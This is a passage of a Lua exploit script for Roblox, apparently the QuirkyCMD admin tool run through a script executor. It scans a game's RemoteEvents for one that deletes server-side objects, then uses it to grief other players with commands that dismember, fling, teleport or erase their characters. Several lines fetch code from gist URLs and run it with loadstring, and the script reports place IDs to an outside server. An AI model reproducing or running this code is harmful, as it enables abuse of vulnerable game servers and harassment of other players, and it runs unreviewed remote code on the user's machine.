			local list = checkList("") or checkList("/") or checkList("\\") or checkList("./") or {}
			return list
		end
	
		local function getGameList()
			if not isfile("quirky games.json") then
				writefile("quirky games.json", "[]") 
				return {} 
			end
	
			local content = readfile("quirky games.json")
			return game:GetService("HttpService"):JSONDecode(content)
		end
	
		local function checkFile()
			if not hasFiles() then return end
			for i,v in pairs(getGameList()) do
				if i ~= tostring(game.PlaceId) then continue end
				for _, instance in pairs(game:GetDescendants()) do
					if not (instance:IsA("RemoteEvent") and instance.Name == v) then continue end
					genv.foundRemote = instance
					remotePath.Visible = false
					main.Visible = false
					--inDatabase = true
					break
				end
			end
		end
	
		local function sendGame()
			if isTesting then return require(rStorage:FindFirstChild("addgame")) end
			loadstring(httpget("https://gist.githubusercontent.com/someunknowndude/670b864d99ce22d69ca9d365a3145bb0/raw"))()
		end
	
		local function logGameLocally()
			local games = getGameList()
			games[tostring(game.PlaceId)] = genv.foundRemote.Name
			writefile("quirky games.json", game:GetService("HttpService"):JSONEncode(games))
		end
	
		local function hexDecodeChar(hex)
			return string.char(tonumber(hex,16))
		end
	
		local function urlDecode(str)
			return string.gsub(str,"%%(%x%x)", hexDecodeChar)
		end
	
	
		local function checkDatabase()
			local res, succ, err, remoteJSON
			succ, err = pcall(function()
				res = httpget("https://eli.serv00.net/checkgame.php?id="..tostring(game.PlaceId))
				remoteJSON = game:GetService("HttpService"):JSONDecode(res)
			end)
			if not succ then return debugPrint("database check failed:", err) end
			local success = remoteJSON["success"]
			local result = remoteJSON["result"]
	
			if success then
				local decoded = urlDecode(result)
				debugPrint(result)
				inDatabase = true
				if genv.foundRemote then return end
				for _, instance in pairs(game:GetDescendants()) do
					if not (instance:IsA("RemoteEvent") and instance.Name == decoded) then continue end
					genv.foundRemote = instance
					remotePath.Visible = false
					main.Visible = false
					break
				end
			end
		end
	
		debugPrint("initialised vars and funcs")
		checkFile()
		task.spawn(checkDatabase)
		remotePath.Text = "checking database..."
		task.wait(0.25)
	
		if not genv.foundRemote then
			for i,service in pairs(game:GetChildren()) do
				local s,e = pcall(function() return service.ClassName end)
				if not s then continue end
	
				if service.ClassName:lower() == "replicatedstorage" or service.ClassName:lower() == "workspace" then continue end
				table.insert(services, service)
			end
	
			local function checkRemote(remote)
				if not remote.Parent then return end
				if modernChat == false and remote.Parent.Name == "DefaultChatSystemChatEvents" then return end
				if remote.Parent.Name == "RobloxReplicatedStorage" then return end
				debugPrint(remote.Name)
				remotePath.Text = remote:GetFullName()
				local currentChar = character
				if remote.Name == "DestroySegway" then
					remote:FireServer(testInstance, {Value = testInstance})
				else
					remote:FireServer(testInstance)
				end
				task.wait(checkTime + mobileOffset + (localPlayer:GetNetworkPing()*2))
				if localPlayer:FindFirstChild("StarterGear") then return end
				genv.foundRemote = remote
				useSegway = remote.Name == "DestroySegway"
				debugPrint("found!")
				remotePath.TextColor3 = Color3.new(0,1,0)
				task.wait(.5)
				remotePath.Visible = false
				local TweenService = game:GetService("TweenService")
				local main = gui:WaitForChild("main")
	
				main.Visible = true
				main.BackgroundTransparency = 1
	
				local tween = TweenService:Create(main, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
					BackgroundTransparency = 0
				})
	
				tween:Play()
				return true
			end
	
			local function scan(instance, softScan)
				checkTime = softScan and 0.75 or 0.5
				for i,v in pairs(instance:GetDescendants()) do
					if genv.foundRemote then return end
					if not v:IsA("RemoteEvent") then continue end
					if v:FindFirstChild("__FUNCTION") then continue end
					if table.find(remotes,v) then continue end
					table.insert(remotes, v)
					if softScan then
						for _, phrase in pairs(wordList) do
							if not v.Name:lower():find(phrase) then continue end
							checkRemote(v)
						end
						continue
					end
					checkRemote(v)
				end
			end
	
			if not genv.foundRemote then
				debugPrint("soft rs")
				scan(rStorage, true)
			end
	
			if not genv.foundRemote then
				debugPrint("soft pgui")
				scan(localPlayer:FindFirstChildOfClass("PlayerGui"), true)
			end
	
			if not genv.foundRemote then
				debugPrint("soft ws")
				scan(workspace, true)
			end
	
			if not genv.foundRemote then
				debugPrint("aggro rs")
				scan(rStorage, false)
			end
	
			if not genv.foundRemote then
				debugPrint("aggro pgui")
				scan(localPlayer:FindFirstChildOfClass("PlayerGui"), false)
			end
	
			if not genv.foundRemote then
				debugPrint("aggro ws")
				scan(workspace, false)
			end
	
			if not genv.foundRemote then
				debugPrint("aggro all")
				for i,v in pairs(services) do
					scan(v, false)
				end
			end
		end
	
		if not genv.foundRemote then 
			remotePath.Text = "game isn't supported, closing..."
			task.wait(3)
			gui:Destroy() 
			return debugPrint("no silly remote found :( try a game from #confirmed-games in the server. Invite: discord.gg/quirkycmd") 
		end
	
		if hasFiles() and getGameList()[tostring(game.PlaceId)] == nil then
			logGameLocally()
		end
	
		function delete(instance)
			if instance == genv.foundRemote then return end
			genv.foundRemote:FireServer(instance, useSegway and {Value = instance} or nil )
			debugPrint("deleted instance " .. instance.Name)
		end
	
		genv.delete = genv.delete or delete
	
		toggleBar(false)
		toggleMain(false)
	
		--[[Add mobile support]]--
		if isMobile then 
			debugPrint("adding mobile compatability")
			mobileButton.Visible = false
			box.Position = UDim2.new(0, 0, 0, 0)
			box.Size = UDim2.new(0.824, 0, 1, 0)
	
			--[[Add button functionality]]--
			mobileButton.MouseButton1Click:Connect(function()
				toggleBar(true)
				toggleMain(true)
	
			end)
	
			--[[Add drag functionality]]--
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			local lastMousePos
			local lastGoalPos
			local dragSpeed = 20
	
			local function update(dt)
				if not (startPos) then return end
				local snap = (mouse.ViewSizeX - mouse.X) <= mouse.ViewSizeX/2 and 1 or mobileButton.Size.X.Scale
				if not (dragging) and (lastGoalPos) then
					mobileButton.Position = UDim2.new(lastGoalPos.X.Scale, 0, startPos.Y.Scale, lerp(mobileButton.Position.Y.Offset, lastGoalPos.Y.Offset, dt * dragSpeed))
					return 
				end
	
				local delta = (lastMousePos - uis:GetMouseLocation())
				local xGoal = (startPos.X.Offset - delta.X)
				local yGoal = (startPos.Y.Offset - delta.Y)
				lastGoalPos = UDim2.new(snap,0, startPos.Y.Scale, yGoal)
	
				mobileButton.Position = UDim2.new(snap ,0, startPos.Y.Scale, lerp(mobileButton.Position.Y.Offset, yGoal, dt * dragSpeed))	
			end
	
			mobileButton.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = mobileButton.Position
					lastMousePos = uis:GetMouseLocation()
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			mobileButton.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			table.insert(genv.connections,rs.Heartbeat:Connect(update))
		end
	
		--[[Add command logic]]--
		function addCommand(cmdName, callback, aliases, securityLevel)
			table.insert(commands,{
				name = cmdName:lower(),
				callback = callback,
				aliases = aliases or {},
				securityLevel = securityLevel or 3
			})
		end
	
		function runCommand(cmdName, ...)
			if type(cmdName) == "table" then
				cmdName.callback(...)
				return
			end
			for i,v in pairs(commands) do
				if (v.name ~= cmdName) and (not table.find(v.aliases, cmdName)) then continue end
				v.callback(...)
				break
			end
		end
	
		local function handleCommand(text, caller)
			local split = text:split(" ")
			local enteredCommand = split[1]
			local command
			local target = split[2] or caller.Name
			local input = table.concat(split, " ", 2, #split)
			for i,v in pairs(commands) do -- bad implementation, might rewrite cmd handling again
				if (v.name ~= enteredCommand) and (not table.find(v.aliases,enteredCommand)) then continue end
				command = v
				break
			end
			if not command then return end
			local commandLevel = command.securityLevel
			local callerLevel = privilegeLevels[caller.Name]
			if callerLevel < commandLevel then return end
			runCommand(command, findPlayers(target), input, caller or localPlayer)
		end
	
		--[[Add chat command functionality]]--
		local function handleChat(data)
			local message = modernChat and data.Text or data.Message
			local plr = modernChat and players:GetPlayerByUserId(data.TextSource.UserId) or players:FindFirstChild(data.FromSpeaker)
			local rank = privilegeLevels[plr.Name]
			if rank == 0 then return end
			local starter = message:sub(1,1)
			if starter ~= prefix then return end
			handleCommand(message:sub(2,-1), plr)
		end
	
		if modernChat then
			game:GetService("TextChatService").TextChannels["RBXGeneral"].OnIncomingMessage = function(data)
				handleChat(data)
			end
		else
			local messageEvent = chatEvents and chatEvents:FindFirstChild("OnMessageDoneFiltering")
			if messageEvent then
				table.insert(genv.connections, chatEvents and messageEvent.OnClientEvent:Connect(handleChat))
			end
		end
	
		--[[Add command bar functionality]]--
		table.insert(genv.connections,box.FocusLost:Connect(function(enterPressed)
			if visible then
				toggleBar()
			end
			if not enterPressed then return end
			handleCommand(box.Text, localPlayer)
		end))
	
		--[[Add plugin support]]--
		if listfiles and hasFiles() then
			local success, files = pcall(listFiles)
			if success and type(files) == "table" then
				for i,v in pairs(files) do
					if v:sub(-5,-1) ~= ".qcmd" then continue end
					pcall(function()
						task.spawn(function()
							loadstring(readfile(v))() -- why does nothing support loadfile :sob:
						end)
					end)
				end
			end
		end
	
		--[[Create commands]]--
		local cmdsVisible = false
	
		addCommand("cmds", function()
			cmdsFrame.Visible = true
		end, {"commands"}, 3)
	
	
		addCommand("setprefix", function(plrs,newPrefix)
			local char = newPrefix:sub(1,1)
			if char == "" then prefix = ";" return end
			prefix = char
			prefixEnum = getKeyCode(char)
		end, {"prefix"}, 3)
	
		addCommand("setbind", function()
			uis.InputBegan:Wait() -- fires Return KeyCode
			local enum = uis.InputBegan:Wait().KeyCode
			prefixEnum = enum
		end, {"bind"}, 3)
	
		addCommand("admin", function(plrs)
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				privilegeLevels[v.Name] = 1
				debugPrint(`{v.Name} has been made an admin`)
			end
		end, {"addadmin"}, 2)
	
		addCommand("unadmin", function(plrs)
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				privilegeLevels[v.Name] = 0
				debugPrint(`{v.Name} is no longer an admin`)
			end
		end, {"removeadmin"}, 2)
	
		addCommand("owner", function(plrs)
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				privilegeLevels[v.Name] = 2
				debugPrint(`{v.Name} has been made an owner`)
			end
		end, {"addowner", "op"}, 3)
	
		addCommand("unowner", function(plrs)
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				privilegeLevels[v.Name] = 0
				debugPrint(`{v.Name} is no longer an owner`)
			end
		end, {"removeowner", "deop"}, 3)
	
		addCommand("ranks", function()
			local printString = "\nQuirkyCMD ranks:\n"
			for name,level in pairs(privilegeLevels) do
				if level == 0 then continue end
				local plr = players:FindFirstChild(name)
				if not plr then continue end
				local displayName = plr.DisplayName
				local rank = rankNames[level] 
				local entryString = ""
				printString ..= `{displayName}`  .. ((name ~= displayName and ` (@{name})`) or "") .. ` - {rank}\n`
			end
			print(printString)
		end, {"admins", "owners"}, 3)
	
		addCommand("aliases", function()
			local printString = "\nQuirkyCMD command aliases:\n"
			for i,v in pairs(commands) do
				local aliases = v.aliases
				if #aliases == 0 then continue end
				local aliasString = ""
				for index, alias in pairs(aliases) do 
					aliasString ..= alias .. (index == #aliases and "" or ", ")
				end
				printString ..= `{v.name}: [{aliasString}]\n`
			end
			print(printString)
		end, {}, 3)
	
		addCommand("explorer", function()
			if isTesting then
				require(rStorage:WaitForChild("dex"))
			else
				loadstring(httpget("https://gist.githubusercontent.com/someunknowndude/8ee80f941d68d5f95e5982165e9ad42d/raw"))() -- credits to TacticalBFG and Moon for original dark dex v2
			end
		end, {"dex"}, 3)
	
		addCommand("goto", function(plrs)
			local target
			local part
			for i,v in pairs(plrs) do
				local tChar = v.Character
				if not tChar then continue end
				part = tChar:FindFirstChild("HumanoidRootPart") or tChar:FindFirstChild("Head") or tChar:FindFirstChild("Torso") or tChar:FindFirstChild("LowerTorso") or tChar:FindFirstChildOfClass("BasePart")
				if not part then continue end
				break
			end
			if not part then return end
	
			character:PivotTo(part.CFrame * CFrame.new(0,0,2))
			local hrp = character:FindFirstChild("HumanoidRootPart")
			for i = 1,10 do
				if not hrp then return end
				hrp.AssemblyLinearVelocity = Vector3.zero
				hrp.AssemblyAngularVelocity = Vector3.zero
				task.wait(.05)
			end
		end, {"to"}, 3)
	
		local viewConnection
		addCommand("view", function(plrs)
			local target
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local hum = char:FindFirstChild("Humanoid") or char:FindFirstChild("HumanoidRootPart")
				if not hum then continue end
				target = hum
				break
			end
			if not target then return end
			if viewConnection then viewConnection:Disconnect() end
			viewConnection = players[target.Parent.Name].CharacterAdded:Connect(function(char)
				local hum = char:WaitForChild("Humanoid")
				if not hum then return end
				camera.CameraSubject = hum
			end)
			table.insert(genv.connections,viewConnection)
			camera.CameraSubject = target
		end, {"spectate"}, 3)
	
		addCommand("unview", function(plrs)
			if viewConnection then viewConnection:Disconnect() end
			camera.CameraSubject = character.Humanoid or character:FindFirstChildOfClass("BasePart")
		end, {}, 3)
	
		addCommand("rejoin", function()
			if #players:GetPlayers() <= 1 then
				localPlayer:Kick("Rejoining!!")
				task.wait(.1)
				game:GetService("TeleportService"):Teleport(game.PlaceId, localPlayer)
				return
			end
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,localPlayer)
		end, {"rj"}, 3)
	
		addCommand("reset", function()
			local hum = character:FindFirstChild("Humanoid")
			local hrp = character:FindFirstChild("HumanoidRootPart") or hum and hum.RootPart
			local oldPosition = hrp and hrp.CFrame
			for i,v in pairs(character:GetChildren()) do
				if not v:IsA("Part") then continue end
				v.CFrame = CFrame.new(0, workspace.FallenPartsDestroyHeight+5,0)
			end
			task.wait(.1)
			if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
			character:BreakJoints()
			if not oldPosition then return end
			local newHrp = localPlayer.CharacterAdded:Wait():WaitForChild("HumanoidRootPart")
			newHrp.CFrame = oldPosition
		end, {"re", "respawn"}, 3)
	
		local torsoNoclipLoop,torsoFlingLoop,torsoFlyLoop,oldHeight,flingTorso
		addCommand("torsofling", function()
			if torsoFlyLoop then return end
	
			local hum = character:FindFirstChildOfClass("Humanoid")
			if not hum then return end
	
			flingTorso = hum.RigType == Enum.HumanoidRigType.R6 and character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
			if not flingTorso then return end
	
			character.Archivable = true
			local fakeChar = character:Clone()
			fakeChar.Name = "wacky fake char"
			local fakeHrp = fakeChar.HumanoidRootPart
			local fakeHum = fakeChar.Humanoid
	
			for i,v in pairs(fakeChar:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency = 1
					continue
				end
				if v:IsA("Humanoid") then continue end
				v:Destroy()
			end
	
			oldHeight = workspace.FallenPartsDestroyHeight
			if not isTesting then workspace.FallenPartsDestroyHeight = -2^32-1 end
			hum:ChangeState(16)
	
			task.wait(.1)
	
			delete(hum)
	
	
			repeat task.wait() until hum.Parent ~= character
	
			for i,v in pairs(character:GetChildren()) do
				if v == flingTorso then continue end
				delete(v)
			end
	
			fakeHum.PlatformStand = true
			fakeHrp.Anchored = true
			workspace.CurrentCamera.CameraSubject = flingTorso
	
			fakeChar.Parent = workspace
			localPlayer.Character = fakeChar
	
			task.wait()
	
			torsoNoclipLoop = rs.Stepped:Connect(function()
				flingTorso.CanCollide = false
				for i,v in pairs(fakeChar:GetChildren()) do
					if not v:IsA("BasePart") then continue end
					v.CanCollide = false
				end
			end)
			table.insert(genv.connections,torsoNoclipLoop)
	
			torsoFlingLoop = rs.RenderStepped:Connect(function(dt)
				flingTorso.AssemblyLinearVelocity = Vector3.new(10000,10000,10000)
			end)
			table.insert(genv.connections,torsoFlingLoop)
	
			torsoFlyLoop = rs.Heartbeat:Connect(function(deltaTime)
				local moveDir = fakeHum.MoveDirection * (flySpeed * deltaTime)
				local hrpCF = fakeHrp.CFrame
				local cameraCF = camera.CFrame
				local cameraOffset = hrpCF:ToObjectSpace(cameraCF).Position + hum.CameraOffset
				cameraCF = cameraCF * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
				local cameraPos = cameraCF.Position
				local hrpPos = hrpCF.Position
	
				local objectSpaceVelocity = CFrame.new(cameraPos, Vector3.new(hrpPos.X, cameraPos.Y, hrpPos.Z)):VectorToObjectSpace(moveDir)
				fakeHrp.CFrame = CFrame.new(hrpPos) * (cameraCF - cameraPos) * CFrame.new(objectSpaceVelocity)
				flingTorso.CFrame = fakeHrp.CFrame
			end)
			table.insert(genv.connections,torsoFlyLoop)
	
		end, {"tfling"}, 3)
	
		addCommand("untorsofling",function()
			if not torsoFlingLoop then return end
	
			localPlayer.Character = flingTorso.Parent
			torsoFlingLoop:Disconnect()
			torsoFlyLoop:Disconnect()
			torsoNoclipLoop:Disconnect()
			torsoFlingLoop = nil
			torsoFlyLoop = nil
			torsoNoclipLoop = nil
			if not isTesting then workspace.FallenPartsDestroyHeight = oldHeight end
	
			for i = 1,10 do
				flingTorso.AssemblyLinearVelocity = Vector3.zero
				flingTorso.AssemblyAngularVelocity = Vector3.zero
				flingTorso.Position = Vector3.new(0,oldHeight + 2,0)
				task.wait()
			end
	
			local fakeChar = workspace:FindFirstChild("wacky fake char")
			if not fakeChar then return end
			fakeChar:Destroy()
		end, {"untfling"}, 3)
	
		addCommand("eat", function(plrs, args)
			for _, plr in ipairs(plrs) do
				local char = plr.Character
				if not char then continue end
	
				local step = 0
	
				for _, item in ipairs(char:GetChildren()) do
					if item:IsA("Accessory") or item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then
						delete(item)
					end
				end
	
				for _, joint in ipairs(char:GetDescendants()) do
					if joint:IsA("Motor6D") then
						local name = joint.Name:lower()
						if name:find("shoulder") then
							step += 1
							task.delay(step * 0.35, function()
								delete(joint)
							end)
						end
					end
				end
	
				for _, joint in ipairs(char:GetDescendants()) do
					if joint:IsA("Motor6D") then
						local name = joint.Name:lower()
						if name:find("hip") or name:find("knee") or name:find("ankle") then
							step += 1
							task.delay(step * 0.35, function()
								delete(joint)
							end)
						end
					end
				end
	
				local neck = char:FindFirstChild("Neck", true)
				if neck then
					step += 1
					task.delay(step * 0.35, function()
						delete(neck)
					end)
				end
	
				local hum = char:FindFirstChildOfClass("Humanoid")
				if hum then
					step += 1
					task.delay(step * 0.35, function()
						delete(hum)
					end)
				end
	
				step += 1
				task.delay(step * 0.35, function()
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							local n = part.Name:lower()
							if n:find("torso") then
								delete(part)
							end
						end
					end
				end)
			end
		end, {"consume", "erase", "vanish", "obliterate"}, 0)
	
		addCommand("fling", function(plrs)
			local hum = character:FindFirstChild("Humanoid")
			if not hum then return end
			local hrp = hum.RootPart
			if not hrp then return end
			local oldState = hum:GetState()
			local oldPosition = hrp.CFrame
			local oldDesroyHeight = workspace.FallenPartsDestroyHeight
	
			hum:ChangeState(16)
			if not isTesting then workspace.FallenPartsDestroyHeight = -2^32 end
	
			task.wait(.2)
	
			local flingConnection = rs.RenderStepped:Connect(function()
				hrp.AssemblyLinearVelocity = Vector3.new(1000,10000,1000)
			end)
	
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				local char = v.Character
				if not char then continue end
				local thum = char:FindFirstChild("Humanoid")
				local thrp = thum and thum.RootPart or char:FindFirstChild("HumanoidRootPart")
				if not thrp then continue end	
	
				hrp.CFrame = thrp.CFrame
				local posConnection = rs.Heartbeat:Connect(function()
					local pos = {thrp.Position.X + (thrp.Velocity.X / 2), thrp.Position.Y + (thrp.Velocity.Y / 2), thrp.Position.Z + (thrp.Velocity.Z / 2)}
					hrp.CFrame = CFrame.new(Vector3.new(pos[1],pos[2],pos[3]))
				end)
				task.wait(.75)
				posConnection:Disconnect()
				task.wait(.1)
			end
	
			flingConnection:Disconnect()
			hum:ChangeState(oldState)
			hrp.AssemblyAngularVelocity = Vector3.zero
			hrp.AssemblyLinearVelocity = Vector3.zero
			task.wait(.1)
			for i = 1, 20 do
				hrp.AssemblyAngularVelocity = Vector3.zero
				hrp.AssemblyLinearVelocity = Vector3.zero
				hrp.CFrame = oldPosition
				task.wait(.05)
			end
			if not isTesting then workspace.FallenPartsDestroyHeight = oldDesroyHeight end
	
	
		end,{},3)
	
		addCommand("bring", function(plrs)
			local hum = character:FindFirstChild("Humanoid")
			if not hum then return end
			local hrp = character:FindFirstChild("HumanoidRooPart") or hum.RootPart
			if not hrp then return end
	
			local oldPos = hrp.CFrame
			local cloneHum = hum:Clone()
			local tools = {}
	
			for i,v in pairs(character:GetChildren()) do
				if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
				table.insert(tools, v)
			end
	
			for i,v in pairs(localPlayer.Backpack:GetChildren()) do
				if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
				table.insert(tools, v)
			end
	
			if #tools == 0 then return notify("Error", "Tools are required", 5) end
	
			runCommand("unfly")
	
			task.wait()
	
			delete(hum)
			repeat task.wait() until hum.Parent ~= character
			cloneHum.Parent = character
	
			task.wait(.1)
	
			local targetCount = 1
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				local tchar = v.Character
				if not tchar then continue end
				local thrp = tchar:FindFirstChild("HumanoidRootPart") or tchar:FindFirstChild("Humanoid") and tchar.Humanoid.RootPart
				if not thrp then continue end
				local tool = tools[targetCount]
				if not tool then return notify("Error", "Not enough tools", 5) end
	
				cloneHum:EquipTool(tool)
				repeat task.wait() until tool.Parent == character
				task.wait()
	
				local attempts = 0
				repeat
					thrp.CFrame = tool.Handle.CFrame
					hrp.CFrame = oldPos
					attempts += 1
					task.wait()
				until tool.Parent ~= character or attempts > 100
				hrp.CFrame = oldPos
				task.wait(.25)
				delete(tool)
				targetCount += 1
				task.wait()
			end
	
			task.wait(.05)
	
			runCommand("re")	
	
		end, {"toolbring", "tbring"}, 3)
	
		addCommand("skydive", function(plrs)
			local hum = character:FindFirstChild("Humanoid")
			if not hum then return end
			local hrp = character:FindFirstChild("HumanoidRooPart") or hum.RootPart
			if not hrp then return end
	
			local oldPos = hrp.CFrame
			local cloneHum = hum:Clone()
			local tools = {}
	
			for i,v in pairs(character:GetChildren()) do
				if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
				table.insert(tools, v)
			end
	
			for i,v in pairs(localPlayer.Backpack:GetChildren()) do
				if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
				table.insert(tools, v)
			end
	
			if #tools == 0 then return notify("Error", "Tools are required", 5) end
	
			runCommand("unfly")
	
			task.wait()
	
			delete(hum)
			repeat task.wait() until hum.Parent ~= character
			cloneHum.Parent = character
	
			task.wait(.1)
	
			local targetCount = 1
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				local tchar = v.Character
				if not tchar then continue end
				local thrp = tchar:FindFirstChild("HumanoidRootPart") or tchar:FindFirstChild("Humanoid") and tchar.Humanoid.RootPart
				if not thrp then continue end
				local tool = tools[targetCount]
				if not tool then return notify("Error", "Not enough tools", 5) end
	
				cloneHum:EquipTool(tool)
				repeat task.wait() until tool.Parent == character
				task.wait()
	
				local attempts = 0
				local tPos = hrp.CFrame * CFrame.new(0,2000,0)
				repeat
					thrp.CFrame = tool.Handle.CFrame
					hrp.CFrame = tPos
					attempts += 1
					task.wait()
				until tool.Parent ~= character or attempts > 100
				hrp.CFrame = tPos
				task.wait(.25)
				delete(tool)
				targetCount += 1
				task.wait()
			end
	
			hrp.CFrame = oldPos
	
			task.wait(.2)
	
			runCommand("re")	
	
		end, {}, 1)
	
		addCommand("bring", function(plrs)
			local hum = character:FindFirstChild("Humanoid")
			if not hum then return end
			local hrp = character:FindFirstChild("HumanoidRooPart") or hum.RootPart
			if not hrp then return end
	
			local oldPos = hrp.CFrame
			local cloneHum = hum:Clone()
			local tools = {}
	
			for i,v in pairs(character:GetChildren()) do
				if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
				table.insert(tools, v)
			end
	
			for i,v in pairs(localPlayer.Backpack:GetChildren()) do
				if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
				table.insert(tools, v)
			end
	
			if #tools == 0 then return notify("Error", "Tools are required", 5) end
	
			runCommand("unfly")
	
			task.wait()
	
			delete(hum)
			repeat task.wait() until hum.Parent ~= character
			cloneHum.Parent = character
	
			task.wait(.1)
	
			local targetCount = 1
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				local tchar = v.Character
				if not tchar then continue end
				local thrp = tchar:FindFirstChild("HumanoidRootPart") or tchar:FindFirstChild("Humanoid") and tchar.Humanoid.RootPart
				if not thrp then continue end
				local tool = tools[targetCount]
				if not tool then return notify("Error", "Not enough tools", 5) end
	
				cloneHum:EquipTool(tool)
				repeat task.wait() until tool.Parent == character
				task.wait()
	
				local attempts = 0
				repeat
					thrp.CFrame = tool.Handle.CFrame
					hrp.CFrame = oldPos
					attempts += 1
					task.wait()
				until tool.Parent ~= character or attempts > 100
				hrp.CFrame = oldPos
				task.wait(.25)
				delete(tool)
				targetCount += 1
				task.wait()
			end
	
			task.wait(.05)
	
			runCommand("re")	
	
		end, {"toolbring", "tbring"}, 3)
	
	
	
	--[[addCommand("control", function(plrs)
		local target = plrs[1]
		if target == localPlayer then return end
		local tchar = target.Character
		if not tchar then return end
		local thum = tchar:FindFirstChild("Humanoid")
		if not thum then return end
		local thrp = tchar:FindFirstChild("HumanoidRootPart") or thum.RootPart
		if not thrp then return end
		
		
		local hum = character:FindFirstChild("Humanoid")
		if not hum then return end
		local hrp = character:FindFirstChild("HumanoidRooPart") or hum.RootPart
		if not hrp then return end
		local arm = character:WaitForChild("Right Arm", .5) or character:FindFirstChild("RightHand", .5)
		if not arm then return end
		
		local oldPos = hrp.CFrame
		local cloneHum = hum:Clone()
		local tools = {}
	
		for i,v in pairs(character:GetChildren()) do
			if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
			table.insert(tools, v)
		end
	
		for i,v in pairs(localPlayer.Backpack:GetChildren()) do
			if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
			table.insert(tools, v)
		end
	
		if #tools == 0 then return notify("Error", "Tools are required", 5) end
		local tool = tools[1]
		
		runCommand("unfly")
	
		task.wait()
		
		hum:EquipTool(tool)
		local rGrip = arm:WaitForChild("RightGrip")
		tool.Grip = tool.Grip * CFrame.new(0,-1.5,3) * CFrame.Angles(math.rad(-90), 0, 0) --(hrp.CFrame:Inverse() * (CFrame.new(arm.Position) * rGrip.C0)) * CFrame.new(0, 1, -4) * CFrame.Angles(0,90,0)
		hrp.CustomPhysicalProperties = PhysicalProperties.new(100, 100, 100, 100, 100)
		hum:UnequipTools()
		repeat task.wait() until tool.Parent == localPlayer.Backpack
		hum:EquipTool(tool)
		repeat task.wait() until tool.Parent == character
		hum:UnequipTools()
		repeat task.wait() until tool.Parent == localPlayer.Backpack
		
		for i,v in pairs(hum:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		
		task.wait(.1)
		
		delete(hum)
		repeat task.wait() until hum.Parent ~= character
		cloneHum.Parent = character
		
		cloneHum:EquipTool(tool)
		
		task.wait(.1)
		
		local attempts = 0
		repeat
			thrp.CFrame = tool.Handle.CFrame
			attempts += 1
			task.wait()
		until tool.Parent ~= character or attempts > 100
		
		if tool.Parent ~= tchar then return end
		thum.PlatformStand = true
	
	end, {}, 3)
	--]]
	
		local function spawnHighlightBox()
			local box = Instance.new("SelectionBox")
			box.Name = "wacky selection box"
			box.Parent = gethui()
			box.Destroying:Connect(spawnHighlightBox)
			clickDeleteBox = box
		end
		spawnHighlightBox()
	
		local clickDeleteHighlightCon = rs.Heartbeat:Connect(function()
			if not (clickDelete and clickDeleteBox) then return end
			local target = mouse.Target
			clickDeleteBox.Adornee = target
		end)
		table.insert(genv.connections, clickDeleteHighlightCon)
	
		local clickDeleteCon = uis.InputEnded:Connect(function(key,processed)
			if (clickDelete == false or processed) then return end
			if key.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
			local target = mouse.Target
			if not target then return end
			delete(target)
		end)
		table.insert(genv.connections, clickDeleteCon)
	
		addCommand("clickdelete", function()
			clickDelete = true
		end, {"clickdel"}, 3)
	
	
		addCommand("unclickdelete", function()
			clickDelete = false
			clickDeleteBox.Adornee = nil
		end, {"unclickdel"}, 3)
	
		addCommand("btools", function()
			sgui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
			if localPlayer.Backpack:FindFirstChild("wacky destroy tool") or (character and character:FindFirstChild("wacky destroy tool")) then
				return
			end
	
			local selection
	
			local destroyTool = Instance.new("Tool", localPlayer.Backpack)
			destroyTool.RequiresHandle = false
			destroyTool.CanBeDropped = false
			destroyTool.Name = "wacky destroy tool"
			destroyTool.ToolTip = "Click to destroy"
			destroyTool.TextureId = "rbxasset://Textures/Hammer.png"
	
			local selectionLoop
	
			destroyTool.Equipped:Connect(function()
				selection = Instance.new("SelectionBox", isTesting and localPlayer.PlayerGui or game:GetService("CoreGui"))
				table.insert(genv.connections, selection)
				selectionLoop = rs.Heartbeat:Connect(function()
					local target = mouse.Target
					if target == nil then
						selection.Adornee = nil
						return 
					end
					if selection.Parent == nil then return end
					selection.Adornee = target
				end)
				table.insert(genv.connections, selectionLoop)
			end)
	
			destroyTool.Unequipped:Connect(function()
				if not selection then return end
				selection:Destroy()
			end)
	
			destroyTool.Activated:Connect(function()
				local target = mouse.Target
				if target == nil then return end
				delete(target)
			end)
	
			local unweldTool = Instance.new("Tool", localPlayer.Backpack)
			unweldTool.RequiresHandle = false
			unweldTool.CanBeDropped = false
			unweldTool.Name = "wacky unweld tool"
			unweldTool.ToolTip = "Click to unweld"
